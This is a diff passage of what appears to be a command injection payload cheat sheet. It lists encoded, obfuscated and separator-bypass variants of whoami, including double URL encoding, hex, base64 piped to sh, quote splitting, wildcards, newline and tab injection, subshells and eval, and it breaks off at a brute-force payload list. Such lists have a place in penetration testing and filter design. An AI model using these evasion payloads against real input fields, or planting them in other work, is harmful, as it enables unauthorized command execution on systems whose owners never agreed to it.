@@ -2139,42 +2139,21 @@ cmd, command, execute, exec, run, shell, process, task, action, operation, scrip
 * Double encoding:  %253bwhoami
 * Hex encoding:  \x77\x68\x6f\x61\x6d\x69
 * Base64 execution:  echo d2hvYW1p | base64 -d | sh
-
-## 🧩 Command Obfuscation
-
-* Use variables:${PATH} tricks
 * Split commands:  w'h'o'am'i
 * Use wildcards:   w*oami
 * Concatenation:  who$@ami
-
-## 🧩 Separator Bypass
-
 * Newline injection:  %0awhoami
 * Tab bypass:  %09whoami
 * Mixed separator:  ;|whoami
 * Logical operators:  &&& whoami
-
-## 🧩 Space Bypass
-
-* Use $IFS:  whoami$IFS
-* Tab instead of space:  whoami%09
-* No-space execution:  {whoami}
-
-## 🧩 Filter Evasion
-
 * Case variation:  WhOaMi
 * Partial command:  /bin/whoami
-* Path-based execution:  /usr/bin/id
-
-# 🔹 Advanced Injection Payloads
-
 * Subshell:  $(whoami)
 * Nested execution:   id 
 * Process substitution:  <(whoami)
 * Eval usage:  eval whoami
 
 # 🔹 Brute Force Command Injection Payload List
-
 ## ✅ Common Commands (Try All)
 ```
 whoami
